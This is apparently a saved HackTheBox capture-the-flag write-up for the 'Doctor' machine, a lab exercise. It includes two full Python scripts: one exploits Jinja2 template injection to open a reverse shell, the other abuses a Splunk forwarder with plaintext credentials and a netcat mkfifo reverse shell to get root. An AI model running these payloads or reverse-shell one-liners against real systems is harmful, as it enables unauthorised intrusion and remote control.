<!DOCTYPE html>
<!-- saved from url=(0037)https://rc-work.github.io/doctor.html -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>
body {

	background-image: url('images/cool-background.png');
	background-attachment: fixed;
	color: #333;
}

</style>


	<title>HackTheBox Doctor Writeup </title>
	<!-- link to main stylesheet -->
	<link rel="stylesheet" type="css/main.css">
	</head>

	<body>
	<div class="container">
    	<div class="blurb">
        <h1>HTB Doctor</h1>

         <p>

	<img src="images/doctor/doc-head.PNG" alt="doctor" class="inline">    										<br> <br> <br>

	We start out with the usual nmap scan                                     									<br> <br>
	<img src="images/doctor/doc-nmap.PNG" alt="nmap" class="inline">         									<br> <br> <br>

	Points of interest here are a web server on port 80 and some sort of splunk server running on 8089 						<br> <br>
      	<img src="images/doctor/web-start-page.PNG" alt="web page" class="inline">         								<br> <br> <br>
	<img src="images/doctor/splunk.PNG" alt="splunk" class="inline">         									<br> <br> <br>


	We're not able to pull much info out of the splunk interface, since all the dirs require creds.							<br>
	The contact us page on the webserver has a link to the domain <b> doctors.htb </b>, this was sort of login portal				<br> <br>
	<img src="images/doctor/login-page.PNG" alt="nmap" class="inline">         									<br> <br> <br>

	After creating a new account and logging in, there is a page to create a new post/comment.			 				<br> <br>
	<img src="images/doctor/inject1-post.PNG" alt="nmap" class="inline">         									<br> <br> <br>

	In the page source there is a hidden link to the /archive page, which appears to display our posts/comments.					<br> <br>
	<img src="images/doctor/archive.PNG" alt="nmap" class="inline"> 										<br> <br> <br>

	The archive page displays our posts/comments, and they are not being sanitized whatsoever. We can directly inject html in the /archive page. 	<br> <br>
	<img src="images/doctor/inject1.PNG" alt="nmap" class="inline">         									<br> <br> <br>

	The challenge now becomes how can we inject html such that when	it gets executed we receive a reverse shell.					<br> <br>
	I found an awesome <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2"> html injection resource here </a> <br><br>
	<img src="images/doctor/jinja2-basic.PNG" alt="web page" class="inline">         								<br> <br> <br>

	Initially I tried the basic injection. I tried to get the server to execute {4*4*4} so that when we query /archive, the number 64 is presented. 		<br>
	We can see on the archive page source that our code is inside of both a title and item bracket, so our injection will start out closing those first.		<br> <br><br>

	After injecting 												<br><br>
	<code>
		&lt;/title&gt; &lt;/item&gt; {4*4*4}
	</code>														<br> <br><br>

	<img src="images/doctor/inject2-post.PNG" alt="basic injection" class="inline">         			<br> <br> <br>

	The page source on /archive should now look like								<br><br>
	<code>
		&lt;item&gt; &lt;title&gt; &lt;/title&gt; &lt;/item&gt; 64&lt;/title&gt; &lt;/item&gt;
	</code>														<br> <br><br>

	We can see the expected output 64, on the archive page								<br> <br>
	<img src="images/doctor/inject2.PNG" alt="basic injection" class="inline">         				<br> <br> <br>

	As well as the expected source code										<br> <br>
	<img src="images/doctor/inject2-source.PNG" alt="basic injection" class="inline">         			<br> <br> <br> <br>

	Further down the github link there is a popen() method where it appears we can run shell commands.		<br> <br>
	<img src="images/doctor/jinja-popen.PNG" alt="popen example" class="inline">         				<br> <br> <br>


	At this point we have all we need to get a shell. I started creating a python script to easily do all this.	<br>
	First step is to grab all of our headers/cookies on the 3 necessary requests from burpsuite. 			<br> <br> <br> <br>

	<i>Registering a new account</i>										<br> <br>
	<img src="images/doctor/burp-register-post.PNG" alt="register new account req" class="inline">         	<br> <br> <br> <br>

	<i>Logging in to new account</i>										<br> <br>
	<img src="images/doctor/burp-login-post.PNG" alt="login to new account req" class="inline">         		<br> <br> <br> <br>

	<i>Posting comment from new account</i>										<br> <br>
	<img src="images/doctor/burp-post-comment.PNG" alt="create new comment req" class="inline">         		<br> <br> <br> <br> <br>


	I then developed the below python script. The script will: 			<br> <br>
	<u1>
		 </u1></p><li>generate a random string 				</li>
		 <li>register a new account under that string		</li>
		 <li>log in and create a new post (with jinja2 popen injection)	</li>
		 <li>start up a nc listener 				</li>
		 <li>visit the /archive page to trigger the connection.</li>
		 <li>interact with listener				</li>
	 <br> <br> <br>


	<h1> User.py </h1>
	<pre>
	#!/usr/bin/python3

	from pwn import *
	import requests, time, random, string

	my_ip = "10.10.14.29"
	my_port = "8000"

	reg_url      = 'http://doctors.htb/register'
	login_url    = 'http://doctors.htb/login'
	home_url     = 'http://doctors.htb/home'
	inject_url   = 'http://doctors.htb/post/new'
	archive_url  = 'http://doctors.htb/archive'

	# generate a random string
	def get_random_string(length):
    		letters = string.ascii_lowercase
    		result_str = ''.join(random.choice(letters) for i in range(length))
    		return result_str

	user = get_random_string(6).capitalize()
	email = user + "@yahoo.com"

	# Exploit the SSTI by calling Popen without guessing the offset
	# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
	exploit = ""
	exploit += " "
	exploit += "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}"
	exploit += "{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;"
	exploit += "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
	exploit += "s.connect((\\\""
	exploit +=  my_ip + "\\\","
	exploit +=  my_port + ")); "
	exploit += "os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
	exploit += "p=subprocess.call([\\\"/bin/bash\\\", \\\"-i\\\"]);'\").read().zfill(417)}}{%endif%}{% endfor %}"

	# the data for our 3 post requests, burpsuite
	reg_dict = { 'username': user, 'email': email, 'password': 'test', 'confirm_password': 'test', 'submit': 'Sign+Up'}
	login_dict = { 'email': email, 'password': 'test', 'submit': 'Login'}
	inject_dict = { 'title': exploit, 'content': 'Hello World', 'submit': 'Post' }

	with requests.Session() as session:

    		# Attempt to hit the register endpoint and create an account
    		get = session.get(reg_url)
    		post = session.post(reg_url, data=reg_dict)
    		if "Your account has been created, with a time limit of twenty minutes!" not in post.text:
        		print("[-] Account creation failed.. exiting")
        		exit(0)
    		print("[+] Created account " + email)

    		# Attempt to login with our new creds
    		login = session.post(login_url, data=login_dict)
    		if "Logout" not in login.text:
        		print("[-] Login failed.. exiting")
        		exit(0)
    		print("[+] Login success")

    		# Create our post with exploit string
    		injection = session.post(inject_url, data=inject_dict)
    		if "Your post has been created!" not in injection.text:
        		print("[-] Post creation failed.. exiting")
        		exit(0)
    		print("[+] Post created successfully")

    		# Startup listener and trigger our injected code
    		l = listen(my_port)
    		time.sleep(2)
    		print("[+] Querying /archive to trigger shell")
    		try:
        		archive = session.get(archive_url, timeout=0.5)
    		except:
        		l.interactive()
	</pre> <br> <br> <br> <br>

	The end result is a user shell as web on doctor.									<br> <br>
	<img src="images/doctor/low-priv-script.PNG" alt="user script" class="inline">   					<br> <br> <br>


	<h1> PRIVESC </h1>													<br> <br> <br>
	There is a backup file present in the apache logs, which contained a password						<br> <br>
	<img src="images/doctor/finding-backup.PNG" alt="backup file" class="inline">   					<br> <br> <br>
	<img src="images/doctor/low-priv-pass.PNG" alt="backup file" class="inline">   					<br> <br> <br>

	This allowed us to pivot to user shaun grab the user.txt flag								<br> <br>
	<img src="images/doctor/user-txt.PNG" alt="user.txt" class="inline">   						<br> <br> <br>

	After attaining user, I started checking out the splunk install on 8089, to see if we could trigger command injection somehow. 		<br>
	Turns out there are several tools already built for this, I opted to use PySplunkWhisperer2 which you can <a href="https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2"> checkout here </a><br> <br>

	The script lets you run bash commands. After some trial and error I was eventually able to get the openBSD netcat one liner to work.		<br>
	I threw this all in another python script and automated the listener.										<br> <br>
	<img src="images/doctor/nc-openbsd-rev.PNG" alt="nc openbsd one liner" class="inline">   							<br> <br><br>



	<h1> Root.py </h1>
	<pre>	#!/usr/bin/python3

	from pwn import *
	import time,os

	my_ip = '10.10.14.29'
	my_port = '8001'
	pysplunk = '/opt/SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py'


	l = listen(my_port)
	time.sleep(0.5)
	exploit = ''
	exploit += 'python ' + pysplunk
	exploit += ' --host 10.10.10.209 '
	exploit += ' --lhost ' + my_ip + ' '
	exploit += ' --username shaun --password Guitar123 '
	exploit += ' --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc ' + my_ip + " " + my_port
	exploit += ' &gt;/tmp/f"  &gt; /dev/null'

	os.system(exploit)
	l.interactive()
	</pre>

	<img src="images/doctor/root2.PNG" alt="root script" class="inline">   					<br> <br> <br>
        <p></p>
</div><!-- /.blurb -->
<div class="blurb">
</div><!-- /.container -->


</div></body></html>
